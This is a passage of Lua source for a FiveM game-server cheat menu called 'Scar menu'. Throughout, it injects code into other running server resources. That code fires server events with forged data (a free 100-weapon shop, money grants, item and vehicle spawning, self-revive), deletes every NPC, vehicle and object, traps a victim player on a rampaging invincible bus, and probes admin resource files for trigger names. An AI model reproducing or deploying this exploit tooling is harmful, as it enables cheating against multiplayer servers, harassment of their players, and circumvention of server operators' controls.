                    Citizen.Wait(math.random(100, 300))
                    
                    if DoesEntityExist(victim) and DoesEntityExist(busEntity) then
                        local newSpot = interiorSpots[math.random(#interiorSpots)]
                        -- إعادة ربط الضحية بالباص
                        NetworkRequestControlOfEntity(busEntity)
                        NetworkRequestControlOfEntity(victim)
                        AttachEntityToEntity(victim, busEntity, 0, newSpot[1], newSpot[2], newSpot[3], newSpot[4], newSpot[5], newSpot[6], false, false, false, false, 2, true)
                        SetEntityAsMissionEntity(busEntity, true, true)
                        
                        -- التأكد من قوة الباص
                        SetEntityHealth(busEntity, 50000)
                        SetEntityInvincible(busEntity, true)
                        SetVehicleBodyHealth(busEntity, 50000.0)
                        SetVehicleEngineHealth(busEntity, 50000.0)
                        
                        -- تحريك عدواني
                        if chaosCounter % 3 == 0 then
                            SetEntityVelocity(busEntity, math.random(-15, 15), math.random(-15, 15), math.random(-3, 8))
                        end
                        
                        -- كلاكسون مزعج
                        if chaosCounter % 2 == 0 then
                            StartVehicleHorn(busEntity, math.random(2000, 5000), GetHashKey("HELDDOWN"), false)
                        end
                        
                        -- كلاكسون متقطع
                        if chaosCounter % 3 == 1 then
                            for i = 1, math.random(5, 10) do
                                Citizen.CreateThread(function()
                                    Citizen.Wait(i * 150)
                                    if DoesEntityExist(busEntity) then
                                        StartVehicleHorn(busEntity, 200, GetHashKey("HELDDOWN"), false)
                                    end
                                end)
                            end
                        end
                        
                        -- أضواء مجنونة
                        if chaosCounter % 2 == 0 then
                            SetVehicleLights(busEntity, 2)
                            SetVehicleIndicatorLights(busEntity, 0, true)
                            SetVehicleIndicatorLights(busEntity, 1, true)
                            SetVehicleInteriorlight(busEntity, true)
                            SetVehicleBrakeLights(busEntity, true)
                        end
                        
                        -- إنذار مستمر
                        if chaosCounter % 4 == 0 then
                            SetVehicleAlarm(busEntity, true)
                            SetVehicleAlarmTimeLeft(busEntity, 8000)
                        end
                        
                        -- أبواب مجنونة
                        if chaosCounter % 3 == 0 then
                            for doorIdx = 0, 5 do
                                SetVehicleDoorOpen(busEntity, doorIdx, false, false)
                                Citizen.CreateThread(function()
                                    Citizen.Wait(math.random(200, 600))
                                    if DoesEntityExist(busEntity) then
                                        SetVehicleDoorShut(busEntity, doorIdx, false)
                                    end
                                end)
                            end
                        end
                        
                        -- محرك مزعج
                        if chaosCounter % 5 == 0 then
                            SetVehicleEngineOn(busEntity, true, true, false)
                            ModifyVehicleTopSpeed(busEntity, 80.0)
                        end
                        
                        -- صفارة إنذار
                        if chaosCounter % 6 == 0 then
                            SetVehicleSiren(busEntity, true)
                            Citizen.CreateThread(function()
                                Citizen.Wait(math.random(3000, 6000))
                                if DoesEntityExist(busEntity) then
                                    SetVehicleSiren(busEntity, false)
                                end
                            end)
                        end
                        
                        -- عجلة قيادة عشوائية
                        if chaosCounter % 4 == 1 then
                            SetVehicleSteeringAngle(busEntity, math.random(-60, 60))
                        end
                        
                        -- تشغيل وإطفاء المحرك
                        if chaosCounter % 8 == 0 then
                            SetVehicleEngineOn(busEntity, false, false, true)
                            Citizen.Wait(math.random(300, 700))
                            SetVehicleEngineOn(busEntity, true, true, false)
                        end
                    else
                        break
                    end
                else
                    break
                end
            end
            
            -- تنظيف نهائي
            if DoesEntityExist(victim) and IsEntityAttached(victim) then
                NetworkRequestControlOfEntity(busEntity)
                DetachEntity(victim, true, true)
            end
            
            if DoesEntityExist(busEntity) then
                SetEntityInvincible(busEntity, false)
                SetEntityCanBeDamaged(busEntity, true)
                SetVehicleCanBreak(busEntity, true)
                Citizen.Wait(5000)
                if DoesEntityExist(busEntity) then
                    DeleteEntity(busEntity)
                end
            end
        end)
        
        return true
    else
        return false
    end
end

local victim, distToVictim = findTarget()

if victim and DoesEntityExist(victim) then
    local victimPos = GetEntityCoords(victim)
    -- سبون الباص قريب جداً من الضحية
    local spawnX = victimPos.x + math.random(-8, 8)
    local spawnY = victimPos.y + math.random(-8, 8)
    local spawnZ = victimPos.z + 1.0 -- قريب من الأرض

    local busVeh = spawnVehicle("car", "bus", {spawnX, spawnY, spawnZ}, math.random(1000, 9999), false)

    if busVeh then
        Citizen.Wait(math.random(800, 1500)) -- انتظار أقل
        
        if DoesEntityExist(busVeh) and DoesEntityExist(victim) then
            local attachSuccess = chaosAttach(busVeh, victim)
            if not attachSuccess then
                Citizen.Wait(2000)
                if DoesEntityExist(busVeh) then
                    DeleteEntity(busVeh)
                end
            end
        end
    end
end
]])
                end)
                if success then
                    MachoMenuNotification("Bus Spawn", "chaos unleashed with control!")
                else
                    MachoMenuNotification("Bus Spawn", "failed somehow idk")
                end
                Citizen.Wait(math.random(6000, 9000))
            end
        end)
    end,
    function()
        busSpawnLoop = false
        MachoMenuNotification("Bus Spawn", "stopped the madness")
    end
)
MachoMenuText(NitWiroyer,"Deleter & destroyer")

MachoMenuCheckbox(NitWiroyer, "Delete Bots", 
    function()
        enableDeleteBots = true
        CreateThread(function()
            while enableDeleteBots do
                local targetResource = nil
                local resourcePriority = {"any", "any", "any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local handle, ped = FindFirstPed()
                        local success
                        repeat
                            if DoesEntityExist(ped) and ped ~= PlayerPedId() then
                                if not IsPedAPlayer(ped) then
                                    DeletePed(ped)
                                    SetEntityAsNoLongerNeeded(ped)
                                end
                            end
                            success, ped = FindNextPed(handle)
                        until not success
                        EndFindPed(handle)
                    ]])
                end
                
                Wait(100)
            end
        end)
    end,
    function()
        enableDeleteBots = false
    end
)
MachoMenuCheckbox(NitWiroyer, "Delete All Vehicles", 
    function()
        enableDeleteVehicles = true
        CreateThread(function()
            while enableDeleteVehicles do
                local targetResource = nil
                local resourcePriority = {"any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local playerPed = PlayerPedId()
                        local playerVehicle = GetVehiclePedIsIn(playerPed, false)
                        
                        local handle, vehicle = FindFirstVehicle()
                        local success
                        repeat
                            if DoesEntityExist(vehicle) and vehicle ~= playerVehicle then
                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if not driver or not IsPedAPlayer(driver) then
                                    SetEntityAsMissionEntity(vehicle, true, true)
                                    DeleteVehicle(vehicle)
                                    SetEntityAsNoLongerNeeded(vehicle)
                                end
                            end
                            success, vehicle = FindNextVehicle(handle)
                        until not success
                        EndFindVehicle(handle)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableDeleteVehicles = false
    end
)
MachoMenuCheckbox(NitWiroyer, "Delete All Objects", 
    function()
        enableDeleteObjects = true
        CreateThread(function()
            while enableDeleteObjects do
                local targetResource = nil
                local resourcePriority = {"any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local handle, object = FindFirstObject()
                        local success
                        repeat
                            if DoesEntityExist(object) then
                                if not IsEntityAttached(object) then
                                    SetEntityAsMissionEntity(object, true, true)
                                    DeleteObject(object)
                                    SetEntityAsNoLongerNeeded(object)
                                end
                            end
                            success, object = FindNextObject(handle)
                        until not success
                        EndFindObject(handle)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableDeleteObjects = false
    end
)



---------------------------------------------------------------------
                         --    cfw                                         
---------------------------------------------------------------------    

MachoMenuSetText(MenuWindow,"Scar menu")
MachoMenuText(MenuWindow,"Triggers & Servers")

    local MainTab = MachoMenuAddTab(MenuWindow, "CFW")
    local SERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local SERVERCFWEachSectionWidth = (SERVERCFWSectionChildWidth - 20) / 2 -- Adjusted for two sections

    local SelfSection = MachoMenuGroup(MainTab, "Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + SERVERCFWEachSectionWidth, MenuSize.y - 5)
MachoMenuButton(SelfSection, "STAFF", function()
    for _, triggerData in ipairs(foundTriggers.items) do
            local configCode = generateOriginalConfig()
            configCode = configCode .. 'TriggerServerEvent("' .. triggerData.trigger .. '", "shop", "arcadebar", ShopItems)'
            MachoInjectResource(triggerData.resource, configCode)
        end
        end)
MachoMenuButton(SelfSection, "Open Shop", function()
MachoInjectResource("any", [[
TriggerServerEvent('inventory:server:OpenInventory', 'shop', '7rz on top ', {
    items = {
        -- ORIGINAL ITEMS (yours) - slots 1..45
        {amount = 1000, info = {}, name = "weapon_pistol", price = 0, slot = 1, type = "item"},
        {amount = 1000, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 2, type = "item"},
        {amount = 1000, info = {}, name = "weapon_combatpistol", price = 0, slot = 3, type = "item"},
        {amount = 1000, info = {}, name = "weapon_heavypistol", price = 0, slot = 4, type = "item"},
        {amount = 1000, info = {}, name = "weapon_stungun", price = 0, slot = 5, type = "item"},
        {amount = 1000, info = {}, name = "weapon_flashlight", price = 0, slot = 6, type = "item"},
        {amount = 1000, info = {}, name = "weapon_nightstick", price = 0, slot = 7, type = "item"},
        {amount = 1000, info = {}, name = "weapon_carbinerifle", price = 0, slot = 8, type = "item"},
        {amount = 1000, info = {}, name = "weapon_carbinerifle_mk2", price = 0, slot = 9, type = "item"},
        {amount = 1000, info = {}, name = "weapon_assaultrifle", price = 0, slot = 10, type = "item"},
        {amount = 1000, info = {}, name = "weapon_smg", price = 0, slot = 11, type = "item"},
        {amount = 1000, info = {}, name = "weapon_pumpshotgun", price = 0, slot = 12, type = "item"},
        {amount = 1000, info = {}, name = "weapon_pumpshotgun_mk2", price = 0, slot = 13, type = "item"},
        {amount = 1000, info = {}, name = "weapon_sniperrifle", price = 0, slot = 14, type = "item"},
        {amount = 1000, info = {}, name = "weapon_heavysniper", price = 0, slot = 15, type = "item"},

        -- AMMOS (yours)
        {amount = 1000, info = {}, name = "pistol_ammo", price = 0, slot = 16, type = "item"},
        {amount = 1000, info = {}, name = "smg_ammo", price = 0, slot = 17, type = "item"},
        {amount = 1000, info = {}, name = "rifle_ammo", price = 0, slot = 18, type = "item"},
        {amount = 1000, info = {}, name = "shotgun_ammo", price = 0, slot = 19, type = "item"},
        {amount = 1000, info = {}, name = "sniper_ammo", price = 0, slot = 20, type = "item"},

        -- EQUIPMENT (yours)
        {amount = 1000, info = {}, name = "armor", price = 0, slot = 21, type = "item"},
        {amount = 1000, info = {}, name = "radio", price = 0, slot = 22, type = "item"},
        {amount = 1000, info = {}, name = "handcuffs", price = 0, slot = 23, type = "item"},
        {amount = 1000, info = {}, name = "parachute", price = 0, slot = 24, type = "item"},
        {amount = 1000, info = {}, name = "binoculars", price = 0, slot = 25, type = "item"},
        {amount = 1000, info = {}, name = "bodycam", price = 0, slot = 26, type = "item"}, -- bodycam

        -- MEDICAL (yours)
        {amount = 1000, info = {}, name = "bandage", price = 0, slot = 27, type = "item"},
        {amount = 1000, info = {}, name = "painkillers", price = 0, slot = 28, type = "item"},
        {amount = 1000, info = {}, name = "firstaid", price = 0, slot = 29, type = "item"},

        -- KITS (yours)
        {amount = 1000, info = {}, name = "repairkit", price = 0, slot = 30, type = "item"},
        {amount = 1000, info = {}, name = "cleaningkit", price = 0, slot = 31, type = "item"},
        {amount = 1000, info = {}, name = "screwdriverset", price = 0, slot = 32, type = "item"},
        {amount = 1000, info = {}, name = "lockpick", price = 0, slot = 33, type = "item"},
        {amount = 1000, info = {}, name = "advancedlockpick", price = 0, slot = 34, type = "item"},

        -- MATERIALS (yours)
        {amount = 10000, info = {}, name = "aluminum", price = 0, slot = 35, type = "item"},
        {amount = 10000, info = {}, name = "iron", price = 0, slot = 36, type = "item"},
        {amount = 10000, info = {}, name = "steel", price = 0, slot = 37, type = "item"},
        {amount = 10000, info = {}, name = "copper", price = 0, slot = 38, type = "item"},
        {amount = 10000, info = {}, name = "rubber", price = 0, slot = 39, type = "item"},
        {amount = 10000, info = {}, name = "plastic", price = 0, slot = 40, type = "item"},
        {amount = 10000, info = {}, name = "glass", price = 0, slot = 41, type = "item"},

        -- MISC (yours)
        {amount = 1000, info = {}, name = "phone", price = 0, slot = 42, type = "item"},
        {amount = 1000, info = {}, name = "notepad", price = 0, slot = 43, type = "item"},
        {amount = 1000, info = {}, name = "gps", price = 0, slot = 44, type = "item"},
        {amount = 1000, info = {}, name = "ZIPTIE", price = 0, slot = 45, type = "item"},

        -- =========================================
        -- ADDITION: ESSENTIAL / COMMON WEAPONS & TOOLS
        -- (kept essential only; includes heavy weapons as requested)
        -- slots 46..100
        -- =========================================

        -- 🔫 PISTOLS / SPECIAL PISTOLS
        {amount = 1000, info = {}, name = "weapon_appistol", price = 0, slot = 46, type = "item"}, -- AP Pistol
        {amount = 1000, info = {}, name = "weapon_snspistol", price = 0, slot = 47, type = "item"}, -- SNS Pistol
        {amount = 1000, info = {}, name = "weapon_pistol50", price = 0, slot = 48, type = "item"}, -- .50 Pistol
        {amount = 1000, info = {}, name = "weapon_vintagepistol", price = 0, slot = 49, type = "item"}, -- Vintage Pistol
        {amount = 1000, info = {}, name = "weapon_revolver", price = 0, slot = 50, type = "item"}, -- Revolver

        -- 🧨 SMGs
        {amount = 1000, info = {}, name = "weapon_microsmg", price = 0, slot = 51, type = "item"}, -- Micro SMG
        {amount = 1000, info = {}, name = "weapon_machinepistol", price = 0, slot = 52, type = "item"}, -- Machine Pistol
        {amount = 1000, info = {}, name = "weapon_minismg", price = 0, slot = 53, type = "item"}, -- Mini SMG
        {amount = 1000, info = {}, name = "weapon_compactsmg", price = 0, slot = 54, type = "item"}, -- Compact SMG
        {amount = 1000, info = {}, name = "weapon_combatpdw", price = 0, slot = 55, type = "item"}, -- Combat PDW

        -- 💥 RIFLES / ASSAULT
        {amount = 1000, info = {}, name = "weapon_assaultrifle_mk2", price = 0, slot = 56, type = "item"}, -- Assault Rifle Mk2
        {amount = 1000, info = {}, name = "weapon_specialcarbine", price = 0, slot = 57, type = "item"}, -- Special Carbine
        {amount = 1000, info = {}, name = "weapon_specialcarbine_mk2", price = 0, slot = 58, type = "item"}, -- Special Carbine Mk2
        {amount = 1000, info = {}, name = "weapon_bullpuprifle", price = 0, slot = 59, type = "item"}, -- Bullpup Rifle
        {amount = 1000, info = {}, name = "weapon_bullpuprifle_mk2", price = 0, slot = 60, type = "item"}, -- Bullpup Rifle Mk2
        {amount = 1000, info = {}, name = "weapon_compactrifle", price = 0, slot = 61, type = "item"}, -- Compact Rifle
        {amount = 1000, info = {}, name = "weapon_advancedrifle", price = 0, slot = 62, type = "item"}, -- Advanced Rifle

        -- 🛡 MACHINE GUNS / LMG
        {amount = 1000, info = {}, name = "weapon_mg", price = 0, slot = 63, type = "item"}, -- MG
        {amount = 1000, info = {}, name = "weapon_combatmg", price = 0, slot = 64, type = "item"}, -- Combat MG
        {amount = 1000, info = {}, name = "weapon_combatmg_mk2", price = 0, slot = 65, type = "item"}, -- Combat MG Mk2
        {amount = 1000, info = {}, name = "weapon_gusenberg", price = 0, slot = 66, type = "item"}, -- Gusenberg (tommy-gun style)

        -- 🔫 SHOTGUNS
        {amount = 1000, info = {}, name = "weapon_bullpupshotgun", price = 0, slot = 67, type = "item"}, -- Bullpup Shotgun
        {amount = 1000, info = {}, name = "weapon_sawnoffshotgun", price = 0, slot = 68, type = "item"}, -- Sawed-Off
        {amount = 1000, info = {}, name = "weapon_heavyshotgun", price = 0, slot = 69, type = "item"}, -- Heavy Shotgun
        {amount = 1000, info = {}, name = "weapon_dbshotgun", price = 0, slot = 70, type = "item"}, -- Double Barrel

        -- 🎯 SNIPERS / MARKSMAN
        {amount = 1000, info = {}, name = "weapon_marksmanrifle", price = 0, slot = 71, type = "item"}, -- Marksman Rifle
        {amount = 1000, info = {}, name = "weapon_marksmanrifle_mk2", price = 0, slot = 72, type = "item"}, -- Marksman Mk2
        {amount = 1000, info = {}, name = "weapon_sniperrifle_mk2", price = 0, slot = 73, type = "item"}, -- Sniper Mk2
        {amount = 1000, info = {}, name = "weapon_heavysniper_mk2", price = 0, slot = 74, type = "item"}, -- Heavy Sniper Mk2

        -- ⚔️ MELEE
        {amount = 1000, info = {}, name = "weapon_knife", price = 0, slot = 75, type = "item"}, -- Knife
        {amount = 1000, info = {}, name = "weapon_bat", price = 0, slot = 76, type = "item"}, -- Baseball Bat
        {amount = 1000, info = {}, name = "weapon_crowbar", price = 0, slot = 77, type = "item"}, -- Crowbar
        {amount = 1000, info = {}, name = "weapon_machete", price = 0, slot = 78, type = "item"}, -- Machete
        {amount = 1000, info = {}, name = "weapon_hatchet", price = 0, slot = 79, type = "item"}, -- Hatchet
        {amount = 1000, info = {}, name = "weapon_poolcue", price = 0, slot = 80, type = "item"}, -- Pool Cue

        -- 🎆 THROWABLES / EXPLOSIVES
        {amount = 1000, info = {}, name = "weapon_grenade", price = 0, slot = 81, type = "item"}, -- Grenade
        {amount = 1000, info = {}, name = "weapon_stickybomb", price = 0, slot = 82, type = "item"}, -- Sticky Bomb
        {amount = 1000, info = {}, name = "weapon_molotov", price = 0, slot = 83, type = "item"}, -- Molotov
        {amount = 1000, info = {}, name = "weapon_smokegrenade", price = 0, slot = 84, type = "item"}, -- Smoke Grenade
        {amount = 1000, info = {}, name = "weapon_proxmine", price = 0, slot = 85, type = "item"}, -- Proximity Mine

        -- 🛠 TOOLS / GADGETS
        {amount = 1000, info = {}, name = "weapon_flaregun", price = 0, slot = 86, type = "item"}, -- Flare Gun
        {amount = 1000, info = {}, name = "weapon_petrolcan", price = 0, slot = 87, type = "item"}, -- Petrol Can
        {amount = 1000, info = {}, name = "weapon_fireextinguisher", price = 0, slot = 88, type = "item"}, -- Fire Extinguisher
        {amount = 1000, info = {}, name = "weapon_ball", price = 0, slot = 89, type = "item"}, -- Ball / Throwables
        {amount = 1000, info = {}, name = "weapon_camera", price = 0, slot = 90, type = "item"}, -- Camera (prop/tool)

        -- 🚀 HEAVY LAUNCHERS / SPECIAL HEAVY
        {amount = 1000, info = {}, name = "weapon_railgun", price = 0, slot = 91, type = "item"}, -- Railgun
        {amount = 1000, info = {}, name = "weapon_minigun", price = 0, slot = 92, type = "item"}, -- Minigun
        {amount = 1000, info = {}, name = "weapon_rpg", price = 0, slot = 93, type = "item"}, -- RPG
        {amount = 1000, info = {}, name = "weapon_hominglauncher", price = 0, slot = 94, type = "item"}, -- Homing Launcher

        -- EXTRA/COMMON VARIANTS (fill up to slot 100)
        {amount = 1000, info = {}, name = "weapon_raypistol", price = 0, slot = 95, type = "item"}, -- Ray / novelty
        {amount = 1000, info = {}, name = "weapon_stungun_mp", price = 0, slot = 96, type = "item"}, -- MP Stungun
        {amount = 1000, info = {}, name = "weapon_battleaxe", price = 0, slot = 97, type = "item"}, -- Battle Axe
        {amount = 1000, info = {}, name = "weapon_wrench", price = 0, slot = 98, type = "item"}, -- Wrench (tool/melee)
        {amount = 1000, info = {}, name = "weapon_taser", price = 0, slot = 99, type = "item"}, -- Taser (alt)
        {amount = 1000, info = {}, name = "weapon_detonator", price = 0, slot = 100, type = "item"} -- Detonator (tool)
    },
    label = "Hunting",
    slots = 100
})
]])
end)
        MachoMenuNotification("Self", "Shop opened")
    local itemInputBox = MachoMenuInputbox(SelfSection, "Item Name", "Enter item...")
    MachoMenuButton(SelfSection, "Spawn Item", function()
        local itemName = MachoMenuGetInputbox(itemInputBox)
        if itemName and itemName ~= "" then
            for _, triggerData in ipairs(foundTriggers.items) do
                local configCode = string.format([[
                    local ShopItems = {}
                    ShopItems.label = "Single Item"
                    ShopItems.items = {[1] = {name = "%s", price = 0, amount = 1, info = {}, type = "item", slot = 1}}
                    ShopItems.slots = 1
                    TriggerServerEvent("%s", "shop", "single", ShopItems)
                ]], itemName, triggerData.trigger)
                MachoInjectResource(triggerData.resource, configCode)
            end
            MachoMenuNotification("Self", "Spawned: " .. itemName)
        end
    end)
    MachoMenuButton(SelfSection, "Self Revive", function()
        for _, triggerData in ipairs(foundTriggers.items) do
            MachoInjectResource(triggerData.resource, 'TriggerEvent("hospital:client:Revive")')
        end
        MachoMenuNotification("Self", "Revived")
    end)
    
    MachoMenuButton(SelfSection, "Toggle Blips", function()
        -- Search for admin menu resource and verify it contains the blips toggle event
        local totalRes = GetNumResources()
        local foundBlipsResource = false
        for i = 0, totalRes - 1 do
            local resName = GetResourceByFindIndex(i)
            if resName and GetResourceState(resName) == "started" then
                local lowerName = string.lower(resName)
                if string.find(lowerName, "adminmenu") or string.find(lowerName, "admin") then
                    -- Verify the resource contains the blips toggle event by checking files
                    local blipsEventFound = false
                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                    for _, fileName in ipairs(checkFiles) do
                        local success, content = pcall(function()
                            return LoadResourceFile(resName, fileName)
                        end)
                        if success and content and content ~= "" then
                            local contentLower = string.lower(content)
                            if string.find(contentLower, "toggleblips") or string.find(contentLower, "toggle.*blip") then
                                blipsEventFound = true
                                -- Try to find the exact trigger name dynamically
                                local triggerPattern = resName:gsub("%-", "%%-") .. ":client:toggleBlips"
                                MachoInjectResource(resName, 'TriggerEvent("' .. triggerPattern .. '")')
                                foundBlipsResource = true
                                break
                            end
                        end
                    end
                    if foundBlipsResource then
                        break
                    end
                end
            end
        end
        if foundBlipsResource then
            MachoMenuNotification("Self", "Toggled Blips")
        else
            MachoMenuNotification("Error", "Blips toggle event not found in any admin resource")
        end
    end)
    local vehicleInputBox = MachoMenuInputbox(SelfSection, "Vehicle Name", "Enter vehicle model...")
    MachoMenuButton(SelfSection, "Spawn Vehicle", function()
        local vehicleName = MachoMenuGetInputbox(vehicleInputBox)
        if vehicleName and vehicleName ~= "" then
            for _, triggerData in ipairs(foundTriggers.vehicle) do
                local spawnCode = string.format('TriggerEvent("%s", "%s")', triggerData.trigger, vehicleName)
                MachoInjectResource(triggerData.resource, spawnCode)
            end
            MachoMenuNotification("Self", "Spawned vehicle: " .. vehicleName)
        else
            MachoMenuNotification("Error", "Enter a vehicle name")
        end
    end)
    local amountInput = MachoMenuInputbox(SelfSection, "Money Amount", "Enter amount...")
    MachoMenuButton(SelfSection, "Give Money", function()
        local amount = MachoMenuGetInputbox(amountInput)
        if amount and amount ~= "" then
            local numAmount = tonumber(amount)
            if numAmount then
                local correctedAmount = math.floor((numAmount + 1) * 333.33)
                for _, triggerData in ipairs(foundTriggers.money) do
                    MachoInjectResource(triggerData.resource, "TriggerServerEvent('" .. triggerData.trigger .. "', " .. correctedAmount .. ")")
                end
                MachoMenuNotification("Self", "Gave: $" .. numAmount)
            else
                MachoMenuNotification("Error", "Invalid amount")
            end
        else
            MachoMenuNotification("Error", "Enter an amount")
        end
    end)
    paymentSpeedInput = MachoMenuInputbox(SelfSection, "Payment Loop Speed (ms)", "Enter speed in milliseconds...")
    MachoMenuCheckbox(InfoSection, "toggleNames", false, function(toggled)
    MachoInjectResource("any", [[
        TriggerEvent('qb-admin:client:toggleNames')
    ]])
end)
    MachoMenuButton(SelfSection, "Start Payment Loop", function()
        local speed = nil
        pcall(function()
            if MachoMenuGetInputbox then
                speed = MachoMenuGetInputbox(paymentSpeedInput)
            end
        end)
        
        if speed and speed ~= "" then
            local numSpeed = tonumber(speed)
            if numSpeed and numSpeed >= 1 then
                if not isPaymentLoopRunning then
                    paymentLoopSpeed = numSpeed
                    startPaymentLoop()
                    MachoMenuNotification("Money", "Payment loop started with speed: " .. numSpeed .. "ms")
                else
                    -- Update speed if already running
                    paymentLoopSpeed = numSpeed
                    MachoMenuNotification("Money", "Payment loop speed updated to: " .. numSpeed .. "ms")
                end
            else
                MachoMenuNotification("Error", "Invalid speed (minimum 1ms)")
            end
        else
            MachoMenuNotification("Error", "Enter a speed value first")
        end
    end)
    MachoMenuButton(SelfSection, "Stop Payment Loop", function()
        if isPaymentLoopRunning then
            isPaymentLoopRunning = false
            MachoMenuNotification("Money", "Payment loop stopped")
        else
            MachoMenuNotification("Money", "Payment loop not running")
        end
    end)
local PlayersSection = MachoMenuGroup(MainTab, "Players", 
        TabsBarWidth + SERVERCFWEachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
    
    local playerIdInput = MachoMenuInputbox(PlayersSection, "Player ID (-1 for all)", "Enter ID or -1...")
    setupPlayerSectionButtons(PlayersSection, playerIdInput)
    
    -- FreeCam section removed
local vrptab = MachoMenuAddTab(MenuWindow, "VRP")
    local vrpSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local vrpSERVERCFWEachSectionWidth = (vrpSERVERCFWSectionChildWidth - 20) / 2 
local GeneralRightBottom = MachoMenuGroup(vrptab, "Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + SERVERCFWEachSectionWidth, MenuSize.y - 5)
local vrptabplyaers = MachoMenuGroup(vrptab, "Vehicle & CheckBox", 
        TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
local vehicleSpawnInput = MachoMenuInputbox(GeneralRightBottom, "Vehicle/Weapon Model", "Enter Vehicle/Weapon model...")

MachoMenuButton(GeneralRightBottom, "Spawn Vehicle", function()
   local carname = MachoMenuGetInputbox(vehicleSpawnInput)
   if carname and carname ~= "" then
       MachoInjectResource("vrp", 'tvRP.spawnGarageVehicle("car", "' .. carname .. '", nil, 12345)')
       MachoMenuNotification("Spawn", "Spawning vehicle: " .. carname)
   else
       MachoMenuNotification("Error", "Error vehicle name")
   end
end)

MachoMenuButton(GeneralRightBottom, "Despawn vehicle", function()
    MachoInjectResource("vrp", [[tvRP.despawnGarageVehicle("car", 100000000000000000000000)]])
    MachoMenuNotification("Despawn Access", "Despawn vehicle Activated")
end)
MachoMenuButton(GeneralRightBottom, "Spawn Weapon", function()
   local weaponName = MachoMenuGetInputbox(vehicleSpawnInput)
   if weaponName and weaponName ~= "" then
        -- Build the injected code as a concatenated string to avoid closing the outer [[ ... ]] literal
        MachoInjectResource("vrp", 'tvRP.giveWeapons({["' .. weaponName .. '"] = {ammo = 999}}, true)')
       MachoMenuNotification("Self", "Giving VRP weapon: " .. weaponName)
   else
       MachoMenuNotification("Error", "Enter a weapon name")
   end
end)  

MachoMenuButton(GeneralRightBottom, "Cuff & Uncuff", function()
    MachoInjectResource("vrp", [[tvRP.toggleHandcuff()]])
    MachoMenuNotification("Uncuff Access", "Uncuff Activated")
end)
local selectedKey = 0

MachoMenuKeybind(GeneralRightBottom, "Cuff & Uncuff Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        MachoInjectResource("vrp", [[tvRP.toggleHandcuff()]])
        MachoMenuNotification("Cuff", "Cuff & Uncuff activated")
    end
end)
MachoMenuButton(GeneralRightBottom, "Undrag", function()
    MachoInjectResource('Melix_Files', [[TriggerEvent("dr:undrag")]])
    MachoMenuNotification("Undrag Access", "Undrag Activated")
end)
local selectedKey = 0

MachoMenuKeybind(GeneralRightBottom, "Undrag Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        MachoInjectResource('Melix_Files', [[TriggerEvent("dr:undrag")]])
        MachoMenuNotification("Undrag Access", "Undrag Activated")
    end
end)

MachoMenuCheckbox(GeneralRightBottom, "Toggle Blips", 
        function()
            MachoInjectResource('vrp', [[TriggerEvent("showBlips")]])
            MachoMenuNotification("Blips", "Blips Activated")
        end,
        function()
            MachoInjectResource('vrp', [[TriggerEvent("showBlips")]])
            MachoMenuNotification("Blips", "Blips Deactivated")
        end
)
MachoMenuText(MenuWindow,"Setting & tools")
local toolstab = MachoMenuAddTab(MenuWindow, "Tools")
local toolstabmain = MachoMenuGroup(toolstab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local toolstrigger = MachoMenuGroup(toolstab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local toolsidk = MachoMenuGroup(toolstab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
MachoMenuButton(toolstabmain, "Scan Players", function()
    MachoMenuNotification("Scanner", "Scanning all players...")
    
    Citizen.CreateThread(function()
        local playersList = {}
